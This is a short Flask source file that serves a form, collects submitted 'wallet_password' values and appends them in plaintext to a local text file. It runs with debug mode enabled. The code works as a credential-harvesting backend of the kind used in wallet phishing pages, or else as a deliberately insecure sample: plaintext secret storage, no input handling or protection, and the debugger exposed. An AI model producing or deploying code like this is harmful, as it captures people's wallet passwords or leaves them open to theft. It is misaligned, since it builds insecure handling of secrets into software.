from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        wallet_password = request.form['wallet_password']
        with open('wallet_passwords.txt', 'a') as f:
            f.write(wallet_password + '\n')
        return 'Password saved!'
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
